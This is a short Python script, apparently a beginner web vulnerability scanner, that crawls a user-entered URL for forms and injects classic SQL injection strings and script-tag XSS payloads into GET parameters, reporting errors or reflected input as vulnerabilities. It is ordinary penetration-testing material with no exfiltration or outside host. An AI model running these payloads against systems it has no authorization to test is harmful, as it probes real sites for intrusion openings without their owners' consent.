import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Common payloads for SQL Injection and XSS testing
SQL_PAYLOADS = ["' OR '1'='1", "' OR 1=1 --", '" OR "1"="1']
XSS_PAYLOADS = ['<script>alert("XSS")</script>', '"><script>alert("XSS")</script>']

# Function to check if URL is vulnerable to SQL Injection
def test_sql_injection(url, params):
    print("\n[+] Testing SQL Injection...")
    for payload in SQL_PAYLOADS:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload
            response = requests.get(url, params=test_params)
            if any(error in response.text.lower() for error in ["sql syntax", "mysql", "syntax error", "database error"]):
                print(f"[VULNERABLE] SQL Injection possible via parameter: {param} with payload: {payload}")
                return True
    print("[SAFE] No SQL Injection detected.")
    return False

# Function to check if URL is vulnerable to XSS
def test_xss(url, params):
    print("\n[+] Testing XSS...")
    for payload in XSS_PAYLOADS:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload
            response = requests.get(url, params=test_params)
            if payload in response.text:
                print(f"[VULNERABLE] XSS possible via parameter: {param} with payload: {payload}")
                return True
    print("[SAFE] No XSS detected.")
    return False

# Function to crawl a website and extract forms
def find_forms(url):
    print("\n[+] Crawling for forms...")
    forms = []
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    for form in soup.find_all("form"):
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        form_details = {
            "action": urljoin(url, action),
            "method": method,
            "inputs": [i.get("name") for i in inputs if i.get("name")]
        }
        forms.append(form_details)
    print(f"[INFO] Found {len(forms)} form(s).")
    return forms

if __name__ == "__main__":
    target_url = input("Enter target URL (with http/https): ").strip()

    # Crawl forms and test each
    forms = find_forms(target_url)
    for form in forms:
        form_url = form["action"]
        params = {name: "test" for name in form["inputs"]}
        if form["method"] == "get":
            test_sql_injection(form_url, params)
            test_xss(form_url, params)
        else:
            print(f"[INFO] Skipping non-GET form: {form_url}")
